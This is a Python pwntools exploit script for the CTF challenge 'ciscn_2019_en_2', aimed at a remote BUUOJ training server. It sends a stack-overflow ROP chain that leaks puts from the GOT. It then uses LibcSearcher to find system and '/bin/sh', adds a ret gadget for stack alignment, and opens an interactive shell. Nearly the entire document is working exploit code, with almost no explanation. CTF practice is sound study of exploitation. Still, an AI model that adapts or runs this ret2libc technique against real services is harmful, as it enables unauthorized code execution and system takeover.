from pwn import *
from LibcSearcher import *
context(log_level='DEBUG')
#io = process("./ciscn_2019_en_2")
io = remote('node3.buuoj.cn',29045)
elf = ELF("./ciscn_2019_en_2")
ret = 0x04006b9
pop_rdi_ret = 0x0400c83
main = 0x400B28

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

payload = 0x58 * 'a'+ p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+ p64(main)

io.recvuntil("choice!")
io.sendline("1")
io.recvuntil("encrypted")
io.sendline(payload)
io.recvuntil("Ciphertext")
io.recvline()
io.recvline()
puts_addr =u64(io.recvuntil("\n")[:-1].ljust(8,'\0'))

libc = LibcSearcher("puts",puts_addr)
base = puts_addr - libc.dump('puts')
system_addr = base + libc.dump("system")
bin_sh = base + libc.dump('str_bin_sh')

payload = 0x58*'a'+p64(ret)+p64(pop_rdi_ret) +p64(bin_sh)+ p64(system_addr)
#Ubuntu18调用system时要ret，不然会crash
#栈对齐
io.sendline('1')
io.recvuntil("encrypted")
io.sendline(payload)
io.interactive()

#gdb.attach(io)